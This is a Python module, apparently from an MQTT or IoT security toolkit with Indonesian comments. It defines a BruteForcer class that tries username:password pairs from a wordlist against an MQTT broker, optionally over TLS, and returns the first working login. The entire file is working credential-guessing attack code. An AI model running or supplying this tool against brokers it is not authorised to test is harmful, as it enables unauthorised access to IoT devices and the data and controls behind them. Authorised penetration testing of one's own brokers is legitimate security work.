import os
import time
import paho.mqtt.client as mqtt
from core.tls_utils import setup_tls_context

class BruteForcer:
    def __init__(self, wordlist_path="assets/wordlist.txt", logger=None):
        self.wordlist_path = wordlist_path
        self.logger = logger
        self.found_credential = None

    def log(self, message):
        if self.logger:
            self.logger(message)
        else:
            print(message)

    def brute_force(self, broker_ip, port=1883, use_tls=False):
        """Melakukan brute force terhadap broker MQTT."""
        if not os.path.exists(self.wordlist_path):
            self.log("[!] Wordlist tidak ditemukan!")
            return None

        try:
            with open(self.wordlist_path, encoding='utf-8', errors='ignore') as f:
                creds = [line.strip().split(":") for line in f if ":" in line]
        except Exception as e:
            self.log(f"[!] Gagal membaca wordlist: {e}")
            return None

        for username, password in creds:
            try:
                success = {"ok": False}

                def on_connect(client, userdata, flags, rc):
                    success["ok"] = (rc == 0)

                client = mqtt.Client()
                client.username_pw_set(username, password)
                client.on_connect = on_connect

                if use_tls:
                    client.tls_set_context(setup_tls_context())

                client.connect(broker_ip, port, 5)
                client.loop_start()
                time.sleep(2)
                client.loop_stop()
                client.disconnect()

                if success["ok"]:
                    self.found_credential = (username, password)
                    self.log(f"[✓] Kredensial valid: {username}:{password}")
                    return self.found_credential
                else:
                    self.log(f"[-] Kredensial salah: {username}:{password}")

            except Exception as e:
                self.log(f"[!] Error koneksi untuk {username}:{password} → {e}")
                continue  # lanjut ke kredensial berikutnya

        self.log("[!] Tidak ada kredensial yang berhasil.")
        return None
